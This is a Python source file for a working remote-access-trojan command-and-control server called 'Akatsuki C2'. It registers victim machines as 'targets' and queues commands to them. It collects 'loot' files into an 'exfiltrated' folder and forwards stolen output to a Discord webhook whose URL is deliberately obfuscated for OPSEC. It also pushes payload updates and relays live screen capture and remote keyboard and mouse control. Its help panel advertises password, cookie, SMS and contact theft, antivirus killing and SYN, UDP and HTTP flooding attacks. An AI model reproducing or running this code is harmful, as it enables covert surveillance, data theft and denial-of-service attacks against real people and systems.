from flask import Flask, request, jsonify, send_from_directory, render_template, Response
import threading, time, uuid, logging, os, msvcrt, shutil, requests as http_requests
from werkzeug.utils import secure_filename
from collections import deque
from flask_socketio import SocketIO, emit, join_room
from flask_sock import Sock
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.live import Live
from rich.layout import Layout
from rich.text import Text
from rich.markup import escape

# --- SETUP ---
logging.getLogger('werkzeug').setLevel(logging.ERROR)
logging.getLogger('socketio').setLevel(logging.ERROR)
logging.getLogger('engineio').setLevel(logging.ERROR)
console = Console()
app = Flask(__name__, template_folder='templates', static_folder='static')
app.config['SECRET_KEY'] = 'akatsuki_' + uuid.uuid4().hex[:16]
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')
sock = Sock(app)

# ===========================================================================
# OPSEC: Discord Webhook lives ONLY here on C2 — NEVER in payloads
# Use obfuscator.py to generate your byte array, then paste below
import hashlib as _hl
def _xd(d, s="k3ycu5t0m", r=4):
    if not d or len(d) < 2: return ""
    SB = [0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16]
    IS = [0]*256; [IS.__setitem__(v, i) for i, v in enumerate(SB)]
    sd = s.encode(); ks = []
    for _ in range(r): sd = _hl.sha256(sd).digest(); ks.append(sd)
    raw = list(d); pc = [ks[-1][0]]
    for i in range(len(raw)):
        cur = raw[i]; raw[i] = (raw[i] - ks[2][i % len(ks[2])]) & 0xFF
        raw[i] ^= pc[-1]; pc.append(cur)
    m = len(raw) // 2; left, right = raw[:m], raw[m:]
    for rd in range(r - 1, -1, -1):
        rk = ks[rd % len(ks)]
        mx = [SB[(b ^ rk[i % len(rk)]) & 0xFF] for i, b in enumerate(left)]
        right = [b ^ x for b, x in zip(right, mx)]; left, right = right, left
    raw = left + right; n = len(raw); rs = int.from_bytes(ks[1][:8], 'big'); sw = []
    for i in range(n - 1, 0, -1):
        rs = (rs * 6364136223846793005 + 1442695040888963407) & 0xFFFFFFFFFFFFFFFF
        sw.append((i, rs % (i + 1)))
    for i, j in reversed(sw): raw[i], raw[j] = raw[j], raw[i]
    for i in range(len(raw)):
        k = ks[0][i % len(ks[0])]
        rt = (i + k) % 8; raw[i] = ((raw[i] >> rt) | (raw[i] << (8 - rt))) & 0xFF
        raw[i] = IS[(raw[i] ^ k) & 0xFF]
    ol = (raw[-2] << 8) | raw[-1]
    return bytes(raw[:ol]).decode()

_WH_ENC = bytes([0x00]) # PASTE_YOUR_BYTES_HERE # PASTE_YOUR_BYTES_HERE
DISCORD_WEBHOOK_URL = _xd(_WH_ENC)

# --- DATA STORES ---
clients = {}
command_queue = {}
input_queues = {}        # {client_id: [input_events]}  for mouse/keyboard relay
live_clients = set()     # Set of client_ids that are streaming
stream_viewers = {}      # {client_id: [websocket_objects]} for JSMpeg broadcast
_selected_client = None
_current_input = ""
_lock = threading.Lock()
_stop_event = threading.Event()
global_logs = deque(maxlen=10)

# ===========================================================================
# WEBHOOK PROXY — Payload sends here, C2 forwards to Discord
# ===========================================================================
def discord_send_text(content):
    """Forward text message to Discord webhook."""
    try:
        http_requests.post(DISCORD_WEBHOOK_URL, json={"content": content}, timeout=10)
    except: pass

def discord_send_file(file_bytes, filename, content=""):
    """Forward file to Discord webhook."""
    try:
        http_requests.post(DISCORD_WEBHOOK_URL, 
                          data={"content": content},
                          files={"file": (filename, file_bytes)}, timeout=30)
    except: pass

# --- API ENDPOINTS ---
@app.route('/register', methods=['POST'])
def register_client():
    client_id = str(uuid.uuid4())
    os_info = request.json.get('os_info', 'Unknown')
    ip_addr = request.headers.get('CF-Connecting-IP', request.remote_addr)
    with _lock:
        clients[client_id] = {'last_seen': time.time(), 'os_info': os_info, 'ip': ip_addr, 'cwd': 'N/A', 'status': 'online'}
    global_logs.append(f"[bold green][+][/] New client: [cyan]{client_id[:8]}[/] ({ip_addr})")
    print(f"[C2 LOG] New client registered: {client_id[:8]} from {ip_addr}")
    return jsonify({'client_id': client_id})

@app.route('/heartbeat/<client_id>', methods=['POST'])
def heartbeat(client_id):
    if client_id not in clients:
        return 'Not Found', 404
    with _lock:
        clients[client_id]['last_seen'] = time.time()
        clients[client_id]['cwd'] = request.json.get('cwd', 'N/A')
        tasks = command_queue.pop(client_id, [])
        # Include pending input events for live control
        inputs = input_queues.pop(client_id, [])
    resp = {'tasks': tasks}
    if inputs:
        resp['input_events'] = inputs
    return jsonify(resp)

@app.route('/report/<client_id>', methods=['POST'])
def report_output(client_id):
    """Receive output from payload and forward to Discord via webhook proxy."""
    data = request.json or {}
    cmd_id = data.get('cmd_id', '?')
    output = data.get('output', '')
    command_line = data.get('command', 'unknown')
    
    header = f"**[Result]** `{client_id[:8]}` (CMD: `{command_line}`)\n"
    if len(output) > 1900:
        # Send as file attachment
        discord_send_file(output.encode('utf-8'), f"result_{cmd_id}.txt", header)
    else:
        discord_send_text(f"{header}```\n{output}\n```")
    
    global_logs.append(f"[dim][📋] Output from [cyan]{client_id[:8]}[/]: {command_line}[/]")
    return 'OK', 200

@app.route('/loot/<client_id>', methods=['POST'])
def receive_loot(client_id):
    """Receive file from payload, save locally AND forward to Discord."""
    if 'file' not in request.files: return 'No file', 400
    file = request.files['file']
    if file.filename == '': return 'No selected file', 400
    
    filename = secure_filename(file.filename)
    file_bytes = file.read()
    
    # Save locally
    os.makedirs('exfiltrated', exist_ok=True)
    save_path = os.path.join('exfiltrated', f"{client_id[:8]}_{filename}")
    with open(save_path, 'wb') as f:
        f.write(file_bytes)
    
    # Forward to Discord
    message = request.form.get('message', f"📁 Loot from `{client_id[:8]}`: `{filename}`")
    discord_send_file(file_bytes, filename, message)
    
    global_logs.append(f"[bold yellow][⬇][/] Loot from [cyan]{client_id[:8]}[/]: [green]{filename}[/]")
    return 'OK', 200

@app.route('/serve/<filename>')
def serve_file(filename):
    return send_from_directory('served', filename)

@app.route('/update')
def serve_update():
    """Serve the latest payload script for self-update."""
    for payload_name in ['payloads-pc.py', 'payloads-ph.py']:
        if os.path.exists(payload_name):
            with open(payload_name, 'r', encoding='utf-8') as f:
                return f.read(), 200, {'Content-Type': 'text/plain'}
    return 'No payload found', 404

# ===========================================================================
# LIVE SCREEN — WebSocket Stream Relay + Viewer
# ===========================================================================

@app.route('/live/<client_id>')
def live_viewer(client_id):
    """Serve the Akatsuki-themed live screen viewer."""
    short_id = client_id[:8]
    # Find full client_id from short
    full_id = None
    with _lock:
        for cid in clients:
            if cid.startswith(short_id) or cid == client_id:
                full_id = cid
                break
    if not full_id:
        return f"Client {short_id} not found", 404
    
    client_info = clients.get(full_id, {})
    return render_template('live.html', 
                          client_id=full_id,
                          short_id=full_id[:8],
                          os_info=client_info.get('os_info', 'Unknown'),
                          ip=client_info.get('ip', 'Unknown'))

@sock.route('/stream_up/<client_id>')
def stream_up(ws, client_id):
    """Receive MPEG-TS stream from payload via WebSocket (works through Cloudflare)."""
    with _lock:
        live_clients.add(client_id)
    global_logs.append(f"[bold red][STREAM][/] Live stream started from [cyan]{client_id[:8]}[/]")
    try:
        while True:
            chunk = ws.receive()
            if chunk is None:
                break
            # Broadcast to all browser viewers for this client
            viewers = stream_viewers.get(client_id, [])
            dead = []
            for v in viewers:
                try:
                    v.send(chunk)
                except:
                    dead.append(v)
            for d in dead:
                if d in viewers:
                    viewers.remove(d)
    except Exception:
        pass
    finally:
        with _lock:
            live_clients.discard(client_id)
        global_logs.append(f"[bold yellow][STREAM][/] Live stream ended from [cyan]{client_id[:8]}[/]")

@sock.route('/stream_down/<client_id>')
def stream_down(ws, client_id):
    """Send MPEG-TS stream to browser viewer."""
    if client_id not in stream_viewers:
        stream_viewers[client_id] = []
    stream_viewers[client_id].append(ws)
    try:
        while True:
            # Keep connection alive, wait for disconnect
            msg = ws.receive()
            if msg is None: break
    except: pass
    finally:
        if ws in stream_viewers.get(client_id, []):
            stream_viewers[client_id].remove(ws)

# --- WebSocket Events (Live Stream) ---
@socketio.on('connect', namespace='/live')
def live_connect():
    pass

@socketio.on('join', namespace='/live')
def on_join(data):
    """Operator browser joins a client's stream room."""
    client_id = data.get('client_id', '')
    join_room(client_id)
    emit('status', {'msg': f'Joined stream for {client_id[:8]}'})

@socketio.on('stream_chunk', namespace='/live')
def handle_stream_chunk(data):
    """Receive H.264 video chunk from payload and relay to viewers."""
    client_id = data.get('client_id', '')
    chunk = data.get('chunk', b'')
    if client_id and chunk:
        emit('video_data', {'chunk': chunk}, room=client_id, namespace='/live', include_self=False)

@socketio.on('input_event', namespace='/live')
def handle_input_event(data):
    """Receive mouse/keyboard event from operator browser, queue for payload."""
    client_id = data.get('client_id', '')
    event = data.get('event', {})
    if client_id and event:
        with _lock:
            input_queues.setdefault(client_id, []).append(event)

@socketio.on('change_quality', namespace='/live')
def handle_quality_change(data):
    """Operator changes stream quality, queue command for payload."""
    client_id = data.get('client_id', '')
    quality = data.get('quality', 'high')
    if client_id:
        with _lock:
            command_queue.setdefault(client_id, []).append({
                'cmd_id': 'live_q',
                'command': f'live quality {quality}'
            })

# ===========================================================================
# TUI GENERATORS
# ===========================================================================
def generate_layout() -> Layout:
    layout = Layout(name="root")
    layout.split(
        Layout(name="header", size=3),
        Layout(name="main", ratio=1),
        Layout(name="footer", size=10),
        Layout(name="cmd_input", size=3),
    )
    layout["main"].split_row(
        Layout(name="clients", ratio=2),
        Layout(name="help", ratio=1)
    )
    return layout

def generate_client_table() -> Panel:
    table = Table(border_style="magenta", expand=True, box=None)
    table.add_column("Short ID", style="cyan", no_wrap=True)
    table.add_column("OS Info", style="yellow")
    table.add_column("CWD", style="green")
    table.add_column("Live", justify="center")
    table.add_column("Status", justify="right")

    with _lock:
        now = time.time()
        active_clients = {cid: data for cid, data in clients.items() if (now - data['last_seen']) < 60}
        
        if not active_clients:
            return Panel(Text("\nWaiting for connections...", justify="center", style="dim yellow"), title="[bold]Active Targets[/]")

        for cid, data in sorted(active_clients.items()):
            diff = int(now - data['last_seen'])
            status = "[green]ONLINE[/]" if diff < 15 else f"[red]{diff}s AGO[/]"
            live_icon = "[bold red]🔴[/]" if cid in live_clients else "[dim]—[/]"
            row_style = "bold reverse cyan" if cid == _selected_client else ""
            table.add_row(
                cid[:8], data.get('os_info', 'N/A')[:20], 
                data.get('cwd', 'N/A')[-30:], live_icon, status,
                style=row_style
            )
    return Panel(table, title="[bold]Targets[/]", border_style="blue")

def generate_input_panel() -> Panel:
    global _current_input, _selected_client
    target_display = _selected_client[:8] if _selected_client else "NO TARGET"
    prompt = f"[bold red]Akatsuki[/]@[bold white]{target_display}[/] > "
    
    term_width = console.width
    prompt_len = len(f"Akatsuki@{target_display} > ")
    max_len = term_width - prompt_len - 5
    
    display_str = _current_input
    if len(display_str) > max_len and max_len > 0:
        display_str = "..." + display_str[-(max_len-3):]
    
    cursor = "_" if int(time.time() * 2) % 2 == 0 else " "
    content = Text.from_markup(f"{prompt}[white]{escape(display_str)}[/]{cursor}")
    return Panel(content, title="[bold yellow]Command Input[/]", border_style="yellow")

def get_log_panel() -> Panel:
    log_text = "\n".join(reversed(global_logs))
    return Panel(log_text, title="[bold]System Events (Newest Top)[/]", border_style="green")

def get_help_panel() -> Panel:
    help_text = (
        "[bold cyan]Shared:[/] [y]export <f>[/], [y]upload <p>[/], [y]select <id>[/]\n"
        "  [y]geo[/], [y]ss[/], [y]rec_a <sec>[/]\n"
        "[bold magenta]PC Specific:[/] [y]wc[/], [y]record <sec> \\[--full][/], [y]rec_v <sec> \\[cam|screen][/]\n"
        "  [red]steal \\[passwords|cookies|all][/], [y]wifi[/], [y]avkill[/]\n"
        "[bold red]DDoS & Process:[/] [y]killer \\[start|stop|status][/], [y]kill <proc>[/], [y]ps[/]\n"
        "  [y]scan[/] (auto LAN), [y]scan <subnet> \\[ports][/]\n"
        "  [red]attack syn <ip> <port> <sec>[/], [red]attack udp <ip> <port> <sec>[/]\n"
        "  [red]attack http <url> <sec>[/], [y]attack stop[/], [y]attack status[/]\n"
        "[bold #c0392b]Live Operations:[/] [y]live start[/], [y]live stop[/], [y]live status[/]\n"
        "  Then open: [u]http://localhost:8080/live/<id>[/]\n"
        "[bold green]Android Specific:[/] [y]wc \\[0|1][/], [y]battery[/], [y]sms \\[N][/], [y]contacts[/]\n"
        "  [y]clipboard[/], [y]callog \\[N][/], [y]vibrate \\[ms][/], [y]toast <msg>[/]\n"
        "  [blue]steal media \\[N|all][/], [red]steal accounts[/], [red]steal notif[/]\n"
        "[bold yellow]C2 System:[/] [y]push_update[/], [red]exit[/]"
    ).replace("[y]", "[yellow]")
    return Panel(help_text, title="[bold]Cheat Sheet[/]", border_style="white")

# --- INTERACTIVE INPUT HANDLER ---
def process_command(cmd_input):
    global _selected_client
    cmd_input = cmd_input.strip()
    if not cmd_input: return

    if cmd_input.lower() in ["exit", "quit"]:
        _stop_event.set()
        return

    if cmd_input.lower().startswith('select '):
        target = cmd_input.split(maxsplit=1)[1].lower() if len(cmd_input.split()) > 1 else ""
        if target in ["none", "clear", ""]:
            _selected_client = None
            global_logs.append("[*] Targeted: [bold white]None[/]")
        else:
            found = False
            with _lock:
                for cid in list(clients.keys()):
                    if cid.startswith(target) or cid == target:
                        _selected_client = cid
                        global_logs.append(f"[*] Targeted: [bold cyan]{cid[:8]}[/]")
                        found = True
                        break
            if not found:
                global_logs.append(f"[bold red][!] Target '{target}' not found.[/]")
    
    elif cmd_input.lower() == 'push_update':
        if not _selected_client:
            global_logs.append("[bold red][!] No target! Use 'select <id>' first.[/]")
            return
        with _lock:
            command_queue.setdefault(_selected_client, []).append({'cmd_id': str(uuid.uuid4())[:4], 'command': 'sys_update'})
        global_logs.append(f"[bold yellow][↻][/] Push update sent to [cyan]{_selected_client[:8]}[/]")

    elif cmd_input.lower().startswith('upl '):
        if not _selected_client:
            global_logs.append("[bold red][!] No target! Use 'select <id>' first.[/]")
            return
        local_path = cmd_input[4:].strip()
        if not os.path.exists(local_path) or not os.path.isfile(local_path):
            global_logs.append(f"[bold red][!] File not found:[/] {local_path}")
            return
        
        filename = secure_filename(os.path.basename(local_path))
        os.makedirs('served', exist_ok=True)
        served_path = os.path.join('served', filename)
        shutil.copy2(local_path, served_path)
        
        with _lock:
            payload_cmd = f"sys_upload {filename}"
            command_queue.setdefault(_selected_client, []).append({'cmd_id': str(uuid.uuid4())[:4], 'command': payload_cmd})
        target_display = _selected_client[:8] if _selected_client else "?"
        global_logs.append(f"[bold cyan][⬆][/] Staged [green]{filename}[/] for {target_display}...")

    elif cmd_input.lower() == 'live start':
        if not _selected_client:
            global_logs.append("[bold red][!] No target! Use 'select <id>' first.[/]")
            return
        with _lock:
            command_queue.setdefault(_selected_client, []).append({'cmd_id': 'live', 'command': 'live start'})
            live_clients.add(_selected_client)
        global_logs.append(f"[bold #c0392b][🔴 LIVE][/] Streaming [cyan]{_selected_client[:8]}[/] → http://localhost:8080/live/{_selected_client[:8]}")

    elif cmd_input.lower() == 'live stop':
        if not _selected_client:
            global_logs.append("[bold red][!] No target![/]")
            return
        with _lock:
            command_queue.setdefault(_selected_client, []).append({'cmd_id': 'live', 'command': 'live stop'})
            live_clients.discard(_selected_client)
        global_logs.append(f"[dim][⏹] Live stopped for [cyan]{_selected_client[:8]}[/][/]")

    elif _selected_client:
        with _lock:
            command_queue.setdefault(_selected_client, []).append({
                'cmd_id': str(uuid.uuid4())[:4], 
                'command': cmd_input
            })
        global_logs.append(f"[dim][*] Sent '{cmd_input}' to {_selected_client[:8]}[/]")
    else:
        global_logs.append("[bold red][!] No target! Use 'select <id>' first.[/]")

def input_handler():
    global _current_input
    while not _stop_event.is_set():
        if msvcrt.kbhit():
            try:
                char = msvcrt.getwch()
                if char in ['\xe0', '\x00']:
                    msvcrt.getwch()
                    continue
                
                if char == '\r':
                    process_command(_current_input)
                    _current_input = ""
                elif char == '\x08':
                    _current_input = _current_input[:-1]
                elif char == '\x03':
                    _stop_event.set()
                else:
                    _current_input += char
            except Exception:
                pass
        time.sleep(0.01)

def connection_monitor():
    while not _stop_event.is_set():
        now = time.time()
        with _lock:
            for cid, data in clients.items():
                diff = now - data['last_seen']
                status = data.get('status', 'online')
                if diff >= 15 and status == 'online':
                    data['status'] = 'offline'
                    global_logs.append(f"[bold yellow][!][/] Target [cyan]{cid[:8]}[/] went [bold red]OFFLINE[/].")
                    live_clients.discard(cid)
                elif diff < 15 and status == 'offline':
                    data['status'] = 'online'
                    global_logs.append(f"[bold green][+][/] Target [cyan]{cid[:8]}[/] is back [bold green]ONLINE[/].")
        time.sleep(1)

# --- MAIN ---
def TUI_main():
    layout = generate_layout()
    layout["header"].update(Panel(Text("暁  A K A T S U K I   C 2  暁", justify="center", style="bold red"), border_style="red"))
    layout["help"].update(get_help_panel())

    input_thread = threading.Thread(target=input_handler, daemon=True)
    input_thread.start()

    monitor_thread = threading.Thread(target=connection_monitor, daemon=True)
    monitor_thread.start()

    with Live(layout, console=console, refresh_per_second=15, screen=True) as live:
        while not _stop_event.is_set():
            layout["clients"].update(generate_client_table())
            layout["footer"].update(get_log_panel())
            layout["cmd_input"].update(generate_input_panel())
            time.sleep(0.05)

if __name__ == '__main__':
    # Use socketio.run instead of app.run for WebSocket support
    api_thread = threading.Thread(
        target=lambda: socketio.run(app, host='0.0.0.0', port=8080, allow_unsafe_werkzeug=True, log_output=False),
        daemon=True
    )
    api_thread.start()
    
    try:
        TUI_main()
    except KeyboardInterrupt:
        pass
    
    console.print("\n[bold red][!] C2 Shutdown.[/]")
    os._exit(0)